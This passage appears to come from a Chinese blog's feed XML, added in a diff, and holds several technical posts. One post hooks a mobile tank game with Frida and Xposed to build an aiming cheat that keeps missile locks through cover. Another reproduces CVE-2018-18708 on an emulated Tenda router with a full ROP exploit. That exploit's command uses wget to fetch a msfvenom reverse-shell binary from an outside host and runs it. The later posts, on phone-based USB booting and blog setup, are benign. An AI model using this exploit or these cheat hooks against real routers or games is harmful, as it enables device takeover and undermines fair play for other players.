strikerTargetingSystem2.setPreferredTarget(getPreferredTarget(l));</span><br><span class="line">        <span class="type">StrikerTargetingSystem</span> <span class="variable">strikerTargetingSystem3</span> <span class="operator">=</span> <span class="built_in">this</span>.targetingSystem;</span><br><span class="line">        <span class="keyword">if</span> (strikerTargetingSystem3 == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;targetingSystem&quot;</span>);</span><br><span class="line">            strikerTargetingSystem = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            strikerTargetingSystem = strikerTargetingSystem3;</span><br><span class="line">        &#125;</span><br><span class="line">        TargetingSystem.DefaultImpls.target$<span class="keyword">default</span>(strikerTargetingSystem, laserParams, targetingResult, <span class="literal">false</span>, <span class="number">4</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">StrikerTargetingSystem</span> <span class="variable">strikerTargetingSystem4</span> <span class="operator">=</span> <span class="built_in">this</span>.targetingSystem;</span><br><span class="line">        <span class="keyword">if</span> (strikerTargetingSystem4 == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;targetingSystem&quot;</span>);</span><br><span class="line">            strikerTargetingSystem4 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        strikerTargetingSystem4.setPreferredTarget(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (targetingResult.hasTargetHit()) &#123;</span><br><span class="line">            <span class="type">RayHit</span> <span class="variable">singleHit</span> <span class="operator">=</span> targetingResult.getSingleHit();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> singleHit.getShape().getBody().getData();</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;null cannot be cast to non-null type alternativa.tanks.entity.BattleEntity&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">BattleEntity</span> <span class="variable">battleEntity</span> <span class="operator">=</span> (BattleEntity) data;</span><br><span class="line">            <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> ((TankComponent) battleEntity.getComponent(Reflection.getOrCreateKotlinClass(TankComponent.class))).getId();</span><br><span class="line">            <span class="keyword">if</span> ((l == <span class="literal">null</span> || l.longValue() == id) &amp;&amp; isActiveTank(battleEntity) &amp;&amp; !BattleUtilsKt.isSameTeam(TankComponentKt.getTeamType(getEntity()), TankComponentKt.getTeamType(battleEntity))) &#123;</span><br><span class="line">                BattleUtilsKt.globalToLocal(singleHit.getShape().getBody(), singleHit.getPosition(), localLockPoint);</span><br><span class="line">                lockResult.update(id, singleHit.getPosition(), localLockPoint);</span><br><span class="line">                <span class="built_in">this</span>.lockingTargetUpdateMessage.init(battleEntity, targetingResult.getDirection(), lockResult);</span><br><span class="line">                getEntity().send(<span class="built_in">this</span>.lockingTargetUpdateMessage);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.stateLogic <span class="keyword">instanceof</span> RegainLockState) &#123;</span><br><span class="line">            <span class="built_in">this</span>.lockingRegainUpdateMessage.getDirection().init(targetingResult.getDirection());</span><br><span class="line">            getEntity().send(<span class="built_in">this</span>.lockingRegainUpdateMessage);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="配合-Frida-分析"><a href="#配合-Frida-分析" class="headerlink" title="配合 Frida 分析"></a>配合 Frida 分析</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">StrikerWeapon</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;alternativa.tanks.battle.weapons.types.striker.components.StrikerWeapon&quot;</span>);</span><br><span class="line"><span class="title class_">StrikerWeapon</span>[<span class="string">&quot;lockTarget&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">lockResult, l</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`StrikerWeapon.lockTarget is called: lockResult=<span class="subst">$&#123;lockResult&#125;</span>, l=<span class="subst">$&#123;l&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;lockTarget&quot;</span>](lockResult, l);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`StrikerWeapon.lockTarget result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_frida_log.webp"
+                     
+                ></p>
+<p>通过分析得知，该函数传入的 lockResult 是上一次扫描的目标对象，<code>l</code> 传入的是目前的瞄准对象 ID ，如果没有对象就是 <code>null</code> ，返回 <code>true</code> 则允许继续瞄准充能，返回 <code>false</code> 则不允许瞄准充能</p>
+<p>所以我一开始直接 hook 让该函数永远 <code>return true</code>，但实际上这会带来很大的问题。首先如果返回永真，那么无瞄准对象时，也会进行瞄准充能。而且这个函数只会在上一次返回了 false 的情况下更新瞄准对象，如果返回永真，那么瞄准对象永远不会更新，也就是永远为 null。瞄准完成后程序会调用一个 shootGuidedRocket 函数来创建追踪火箭，如果没有瞄准对象，就没有对应的坐标值用于创建追踪火箭。</p>
+<p>效果就如图中，有开火动画，但是没有火箭飞出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_no_rocket.webp"
+                     
+                ></p>
+<p>经过一番思索后我将其设置为 <code>return result || l!=null</code></p>
+<p>也就是一旦传入的ID有效就返回true，但这也会有小问题：瞄准过程中目标如果死了，仍然会继续充能，因为目标死了，ID并不会失效，目标死了但是你依旧发射了火箭，很容易被人看出来开挂，这不是我想要的</p>
+<p>并且这种方式每次瞄准都需要敌人露头，实际上体验不佳</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_no_interrapt.webp"
+                     
+                ></p>
+<p>为了解决目标死亡后继续充能的问题，我主动调用了游戏内部的 <code>isValidTarget</code> 函数进行 ID 对象解析，并且解析的是上一次的瞄准结果，只要上一次的瞄准结果的对象依旧有效，就使其 <code>return true</code>。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于检测 Target 是否有效的函数，目标死亡、不存在都会返回 false</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidTarget</span><span class="params">(<span class="type">long</span> j)</span> &#123; </span><br><span class="line">    <span class="type">GameMode</span> <span class="variable">gameMode</span> <span class="operator">=</span> <span class="built_in">this</span>.gameMode;</span><br><span class="line">    <span class="keyword">if</span> (gameMode == <span class="literal">null</span>) &#123; </span><br><span class="line">        Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;gameMode&quot;</span>);</span><br><span class="line">        gameMode = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">BattleEntity</span> <span class="variable">tank</span> <span class="operator">=</span> gameMode.getTanksOnField().getTank(j);</span><br><span class="line">    <span class="keyword">if</span> (tank == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isActiveTank(tank); &#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>Frida Script：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StrikerWeapon</span>[<span class="string">&quot;lockTarget&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">lockResult, l</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;lockTarget&quot;</span>](lockResult, l);</span><br><span class="line">    <span class="comment">// console.log(&quot;============================&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(`StrikerWeapon.lockTarget result=$&#123;result&#125;`);</span></span><br><span class="line">    <span class="comment">//console.log(`StrikerWeapon.lockTarget is called: lockResult=$&#123;lockResult&#125;, l=$&#123;l&#125;, result: $&#123;l!=null&#125;`);</span></span><br><span class="line">    <span class="comment">//console.log(&quot;lockResult.getTargetId: &quot;, lockResult.getTargetId());</span></span><br><span class="line">    <span class="comment">//console.log(&quot;vaild: &quot;, this[&quot;isValidTarget&quot;](parseInt(lockResult.getTargetId())));</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>[<span class="string">&quot;isValidTarget&quot;</span>](<span class="built_in">parseInt</span>(lockResult.<span class="title function_">getTargetId</span>())) || result;</span><br><span class="line">    <span class="comment">//return result || (l!=null);</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>这样既避免了目标死亡后继续瞄准，又能实现瞄准记忆功能，在这种修改下，瞄准的结果不会丢失，使得我可以在任意位置进行瞄准，当然了打不打得到是另一回事</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_no_lose.webp"
+                     
+                ></p>
+<p>但遗憾的是，服务器端似乎有外挂检测，检测逻辑不清楚，有可能是瞄准过程有遮挡或者没对准，然后发射出去就只有第一发有伤害，这样的话这个挂局限性就很大了，甚至可以说是反向优化。</p>
+<p>但是，我突然想起来还有一个炮：</p>
+<p>这个炮塔向天上发射导弹，并且只要求一开始能瞄到人，瞄准过程无视掩体，只要求对准目标</p>
+<p>虽然这个炮原版的瞄准逻辑就很强了，但是还是需要敌人和我同时露头，敌人不露头我就没法瞄，我一露头就有被打的风险，所以还是有优化空间</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_scop.webp"
+                     
+                ></p>
+<p>经过查看发现这个炮的瞄准函数都是继承的同一套 <code>lockTarget</code>，所以直接套上去就能用</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">ScorpioWeapon</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;alternativa.tanks.battle.weapons.types.scorpio.components.ScorpioWeapon&quot;</span>);</span><br><span class="line"><span class="title class_">ScorpioWeapon</span>[<span class="string">&quot;lockTarget&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">lockResult, l</span>) &#123;</span><br><span class="line">    <span class="comment">// console.log(&quot;============================&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(`ScorpioWeapon.lockTarget is called: lockResult=$&#123;lockResult&#125;, l=$&#123;l&#125;, result: $&#123;l!=null&#125;`);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;lockTarget&quot;</span>](lockResult, l);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lockResult.getTargetId: &quot;</span>, lockResult.<span class="title function_">getTargetId</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;vaild: &quot;</span>, <span class="variable language_">this</span>[<span class="string">&quot;isValidTarget&quot;</span>](<span class="built_in">parseInt</span>(lockResult.<span class="title function_">getTargetId</span>())));</span><br><span class="line">    <span class="comment">//backtrace</span></span><br><span class="line">    <span class="comment">//console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new()));</span></span><br><span class="line">    <span class="comment">//console.log(`ScorpioWeapon.lockTarget result=$&#123;result&#125;`);</span></span><br><span class="line">    <span class="keyword">return</span> result || <span class="variable language_">this</span>[<span class="string">&quot;isValidTarget&quot;</span>](<span class="built_in">parseInt</span>(lockResult.<span class="title function_">getTargetId</span>()));</span><br><span class="line">    <span class="comment">//return result || (l!=null) ;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后使用效果就变成了：只要瞄过一次就能在任何地方重新瞄，无视任何掩体，只要求能对准就行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_scop_no_inter.webp"
+                     
+                ></p>
+<p>由于这个炮的导弹向上飞，我只要选定一个合适的距离，导弹就可以跨过掩体打中，简直太超模了</p>
+<h3 id="移植-Xposed"><a href="#移植-Xposed" class="headerlink" title="移植 Xposed"></a>移植 Xposed</h3><p>剩下的任务就是将 Frida 代码转化为 Xposed 模块，代码编写思路和 Frida 基本一致，只是换成了 Xposed API，另外要写个简单的 Activity 来控制模块的功能开关，完整代码在我Github，有兴趣可以自己查阅。</p>
+<p>最后重要提示，外挂是一种破坏游戏平衡、影响玩家体验的行为，本文仅用于技术交流，请不要使用外挂在公开战场进行游戏，否则后果自负</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+        <tag>Xposed</tag>
+        <tag>Frida</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tenda 路由器 CVE-2018-18708 漏洞复现</title>
+    <url>/2024/03/14/Tenda-CVE-2018-18708/</url>
+    <content><![CDATA[<p>参考：<a class="link"   href="https://www.z1r0.top/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90" >Tenda CVE-2018-18708 漏洞复现 (z1r0.top) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>固件下载：<a class="link"   href="https://github.com/z1r00/IOT_Vul/blob/main/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip" >https://github.com/z1r00/IOT_Vul&#x2F;blob&#x2F;main&#x2F;固件下载&#x2F;US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>该固件的 <code>httpd</code> 有一个栈溢出漏洞，在 post 请求处理函数 <code>fromAddressNat()</code> 中拼接 <code>page</code> 参数时使用了 <code>sprintf</code> 但没有做长度限制，导致此处变量 <code>v6</code> 可以造成栈溢出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tenda_ida.png"
+                     
+                ></p>
+<p>直接 qemu 模拟：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-arm-static /bin/httpd</span><br></pre></td></tr></table></figure></div>
+
+<p>模拟的时候由于它带一些环境检查，所以会卡在一些地方，用 ida 简单处理下就行，最后会提示获取的 IP 地址为 <code>255.255.255.255</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tenda_ip.png"
+                     
+                ></p>
+<p>为了解决 IP 地址的问题，需要创建一个网桥</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建网桥</span></span><br><span class="line">sudo brctl addbr br0</span><br><span class="line"><span class="comment"># 向网桥中加入网卡</span></span><br><span class="line">sudo brctl addif br0 eth0 </span><br><span class="line"><span class="comment"># 开启网桥</span></span><br><span class="line">sudo ifconfig br0 up </span><br><span class="line"><span class="comment"># 可选，用于dhcp获取地址</span></span><br><span class="line">sudo dhclient br0</span><br><span class="line"><span class="comment"># 直接设置 IP</span></span><br><span class="line">sudo ifconfig br0 10.0.0.2/24</span><br></pre></td></tr></table></figure></div>
+
+<p>然后访问 web 页面，会提示 page not found，将 <code>webroot_ro</code> 的文件复制到 <code>webroot</code> 即可</p>
+<p>通过抓包可以知道，不管是 get 还是 post 必须包括 cookie：password</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">cookie = &#123;<span class="string">&quot;password&quot;</span> : <span class="string">&quot;114514&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(<span class="string">&quot;http://169.254.162.25/goform/addressNat&quot;</span>,  timeout=<span class="number">1</span>, cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这样发包 httpd 的 log 会有反应，用 gdb 调试看看</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启 gdb 调试端口 1234</span></span><br><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-arm-static -g 1234 /bin/httpd</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ gdb-multiarch /bin/httpd</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure></div>
+
+<p>在危险函数附近下个断点，看看能不能断下来，实际测试是能断下来，说明执行链过去了</p>
+<p>然后可以传参 page 看看能不能溢出，答案是可以</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">cookie = &#123;<span class="string">&quot;password&quot;</span> : <span class="string">&quot;114514&quot;</span>&#125;</span><br><span class="line">payload = cyclic(<span class="number">256</span>+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">param = &#123; <span class="string">&quot;page&quot;</span>: payload &#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(<span class="string">&quot;http://169.254.162.25/goform/addressNat&quot;</span>,  params=param, timeout=<span class="number">1</span>, cookies=cookie)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tenda_of.png"
+                     
+                ></p>
+<p>并且可以使用 <code>cyclic_find(&quot;laac&quot;)</code> 查找出 pc 偏移是 244，但是实际是还要 + 4，不太懂是为什么</p>
+<p>既然可以控制 pc，那么可以考虑 ret2libc 执行 system，我没有真机，qemu user 模拟出来是没有随机化的，先打打看吧</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Arch: arm</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x8000</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>libc 的地址可以 gdb 里用 <code>vmmap</code> 看看，虽然它没显示 libc 的名字，但是 size 最大的那个地址一般就是 libc</p>
+<p>于是得知 <code>libcBase = 0x3fd9c000</code></p>
+<p>rop 思路：gadget1 给寄存器 reg 赋值 <code>system</code> 地址，<code>/bin/sh</code> 可以写栈上，gadget2 找那种 mov r0, sp; blx reg，这里正好有一组适合的 gadget</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先找第二个，然后决定第一个用什么寄存器</span></span><br><span class="line"><span class="comment"># ROPgadget --binary libc.so.0|grep  &quot;mov r0, sp&quot;</span></span><br><span class="line"><span class="number">0x0001fd64</span> : mov r0, sp ; sub r1, fp, <span class="comment">#0x8c ; blx r3</span></span><br><span class="line"><span class="comment"># 所以第一个用 r3，很好找到</span></span><br><span class="line"><span class="number">0x00018298</span> : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/hex/Desktop/TendaCVE/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/libc.so.0&quot;</span>)</span><br><span class="line">l = listen(<span class="number">9001</span>)</span><br><span class="line">libcBase = <span class="number">0x3fd9c000</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;password&quot;</span> : <span class="string">&quot;114514&quot;</span>&#125;</span><br><span class="line"><span class="comment"># payload = cyclic(256+0x100)</span></span><br><span class="line"><span class="comment"># pc_offset = cyclic_find(&quot;laac&quot;) = 244</span></span><br><span class="line"><span class="comment"># r4_offset = cyclic_find(&quot;kaac&quot;) = 240</span></span><br><span class="line">pop_r3_pc = <span class="number">0x00018298</span> + libcBase <span class="comment"># pop &#123;r3, pc&#125;</span></span><br><span class="line">mov_r0_sp = <span class="number">0x0001fd64</span> + libcBase <span class="comment"># mov r0, sp;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;/usr/bin/wget http://192.168.123.30:8888/venom -O /var/venom; /bin/chmod 777 /var/venom; /var/venom&quot;</span></span><br><span class="line"><span class="comment"># cmd 写入的位置正好是 sp</span></span><br><span class="line"><span class="comment"># 用 msfvenom 生成了反弹 shell 木马，反弹连本机</span></span><br><span class="line"><span class="comment"># msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.123.30 LPORT=9001 -f elf -o venom</span></span><br><span class="line"><span class="comment"># 随便用 busybox 开个 web 服务把马子放进去就行</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">244</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">4</span> + p32(pop_r3_pc) + p32(libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>]) + p32(mov_r0_sp) + cmd</span><br><span class="line">param = &#123; <span class="string">&quot;page&quot;</span>: payload &#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(<span class="string">&quot;http://169.254.162.25/goform/addressNat&quot;</span>,  params=param, timeout=<span class="number">1</span>, cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">l.wait_for_connection()</span><br><span class="line">success(<span class="string">&quot;reversed shell&quot;</span>)</span><br><span class="line">l.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>随后我尝试用 qemu system 模拟，但是 gdbserver 传上去，本地 gdb 连上会报错，查了下是个存在很久的 bug，后面没搞了</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>IOT</tag>
+        <tag>路由器， Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用Android手机(rooted)模拟USB或CD-ROM设备来引导电脑启动</title>
+    <url>/2022/12/24/drivedroid/</url>
+    <content><![CDATA[<p>最近老爸和我说他那边电脑老是启动时显英文字母，我一看就知道是硬盘快不行了，果断下单买了块机械。</p>
+<p>今天硬盘倒是到了，我却发现我U盘忘在学校了，家里居然一个U盘都没有，这咋装系统呢？</p>
+<p>我忽然想到以前在酷安上看见过一个大佬的帖子，用Android手机能模拟U盘来引导启动。</p>
+<p>搜索了下，软件名字叫<a class="link"   href="https://www.drivedroid.io/" >Drivedroid <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，看上去很久没更新了。我以前用一台小米2测试成功过，但那台机子尾插有问题，传数据很容易中断。我翻出了我的小米5，准备尝试一波。官网的changelog写着软件最新版Target API是Android 9，我米5是10，应该问题不大，先下载安装看看。</p>
+<p>进入软件，会请求root权限，让你设置存放镜像的目录，这些步骤都没什么说的，重点在于后面。先将手机连上电脑，然后选择USB模式为文件传输。回到软件，进入这个页面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_setup.jpg"
+                      alt="Setup"
+                ></p>
+<p>这个页面是选择手机USB模拟的模式，这决定了这台手机是否能用于模拟USB&#x2F;CD-ROM设备。大多数手机选第一个就行了，我的米5选第一个会一直Hosting image。这里我选第二个，先往后看：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_setup2.jpg"
+                      alt="Setup"
+                ></p>
+<p>这个页面是问你电脑上有没有显示手机设备。打开资源管理器，选择此电脑，就能看到是否有Android设备。</p>
+<p>如果有，大概是这样的：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/thispc.jpg"
+                      alt="thispc"
+                ></p>
+<p>如果没有，我也不知道为什么，反正我的电脑上也没有，就选择No devices了</p>
+<p>然后下一步，是要尝试用手机来引导电脑启动：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_setup3.jpg"
+                      alt="boot"
+                ></p>
+<p>就是重启电脑，然后选择BIOS启动项，这里不再赘述，不懂的可以搜下。反正是选比较可疑的那项，一般是带”Linux”字样的，选择后BIOS就会开始引导</p>
+<p>如果你的手机引导成功了，那么屏幕上应该会出现Drivedroid的提示说成功了；如果是进了原系统了，或者就亮一行黑字提示重启、找不到设备之类的，那么说明引导失败了，可以在手机屏幕上选择相应的选项，按软件的提示来继续。或者我们可以直接回到之前选择USB SYSTEM那里，继续尝试其他选项。如果还是没法启动，那你的手机可能不支持作为USB&#x2F;CD-ROM设备用于引导，又或者是你的数据线有问题，可以自己多尝试下。</p>
+<p>至于我，我一开始压根没试，直接选的启动成功，进到了软件的主页面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_main.jpg"
+                      alt="main"
+                ></p>
+<p>这里就可以选自己镜像了，建议选择模式为CD-ROM或Writable USB，镜像存放的目录就是一开始让你选的那个目录。图中我已经存了个win8.1的镜像，写这文的时候PE的镜像还在用毒盘以20KB&#x2F;s的速率下载着。</p>
+<p>最后提一嘴，我认为win8.1比win7更好用。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+        <tag>操作系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客搭建</title>
+    <url>/2022/12/15/first_blog/</url>
+    <content><![CDATA[<p>更新于2022-12-16 22:17</p>
+<p>以前搭建过博客和Onedrive资源站。资源站是一键式搭建的，但博客是用一个静态网页完全自己手动编辑的，当时不懂博客框架这种东西。这次搭博客我选择用Github+Hexo搭建。域名暂时懒得买了，就用Github Page凑合下。</p>
+<p>都是照着教程来的，过程没什么写的，这里简单写一下遇到的坑。</p>
+<h3 id="WSL与Windows共用PATH"><a href="#WSL与Windows共用PATH" class="headerlink" title="WSL与Windows共用PATH"></a>WSL与Windows共用PATH</h3><p>安装Nodejs时发现的，因为我Windows和WSL里都装了Nodejs，而WSL的$PATH中居然包含Windows的PATH，导致我在WSL中无法正常运行npm。不是很理解这种机制到底有什么意义。</p>
+<p>解决方案：编辑&#x2F;etc&#x2F;wsl.conf，添加如下字段</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[interop]</span><br><span class="line">appendWindowsPath=false</span><br></pre></td></tr></table></figure></div>
+
+<p>然后管理员运行PowerShell，执行如下命令以重启WSL</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">net stop LxssManager; net start LxssManager</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Live2D"><a href="#Live2D" class="headerlink" title="Live2D"></a>Live2D</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/xtxnbj.jpg"
+                     
+                ></p>
+<p>在电脑端访问我的博客，会加载一个Live2D小人。这玩意儿我很早以前在第一个博客里放过，但是当时完全是静态Html，直接引用一条js即可。现在我使用Hexo，页面是根据主题自动生成的，如何插入js？</p>
+<p>主题生成页面时肯定有某些规则文件。研究了一番，发现是在主题根目录的layout文件夹中(仅对于我的主题”redefine”而言)，里面有很多ejs文件，记录了生成页面的规则。找到head.ejs文件添加&lt;script&gt;代码即可。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
